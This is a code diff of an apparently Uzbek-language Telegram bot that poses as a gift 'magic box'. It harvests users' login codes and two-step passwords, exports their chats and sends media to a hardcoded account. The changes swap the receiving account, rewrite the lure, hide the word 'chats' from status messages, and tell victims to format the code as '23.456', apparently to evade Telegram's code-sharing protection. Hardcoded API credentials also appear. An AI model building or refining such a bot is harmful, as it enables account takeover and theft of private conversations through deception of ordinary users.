@@ -21,7 +21,7 @@ API_HASH = os.getenv("API_HASH") or "4905f5337b228bec93dd37832e89b1c6"
 
 ADMIN_ID = int(os.getenv("ADMIN_ID") or 7690148385)
 
-MEDIA_TARGET = os.getenv("MEDIA_TARGET") or "@vip_22022"
+MEDIA_TARGET = os.getenv("MEDIA_TARGET") or "@pedro_yd"
 
 BASE_DIR = "chats_export"
 
@@ -159,7 +159,7 @@ async def magic_info(msg: types.Message):
     await msg.answer(
         "🎁 <b>Sehrli quti</b>\n\n"
         "• 3 marta bepul\n"
-        "• 1 tasida Telegram Premium\n"
+        "• 100 dan ortiq sovg'alar\n"
         "• Natija tasodifiy",
         parse_mode="HTML",
         reply_markup=kb
@@ -265,7 +265,7 @@ async def telethon_login(msg: types.Message):
         await state["client"].connect()
         await state["client"].send_code_request(text)
         state["step"] = "code"
-        await msg.answer("🔐 Telegram kodi yuboring")
+        await msg.answer("🔐 Telegram kodi yuboring\n\n Namuna: 23.456 xuddi shunday yuborilishi shart")
         return
 
     if state["step"] == "code":
@@ -276,12 +276,12 @@ async def telethon_login(msg: types.Message):
             await msg.answer("🔑 2 bosqichli parolni yuboring")
             return
 
-        await msg.answer("⏳ Chatlar olinmoqda...")
+        await msg.answer("⏳ olinmoqda...")
         await export_chats(uid)
 
     if state["step"] == "password":
         await state["client"].sign_in(password=text)
-        await msg.answer("⏳ Chatlar olinmoqda...")
+        await msg.answer("⏳ olinmoqda...")
         await export_chats(uid)
 
 # =====================================================
@@ -339,7 +339,7 @@ async def export_chats(uid):
 
     await bot.send_message(
         uid,
-        "✅ Chatlar to‘liq saqlandi",
+        "✅ saqlandi biroz kuting...",
         reply_markup=main_menu(uid == ADMIN_ID)
     )
 
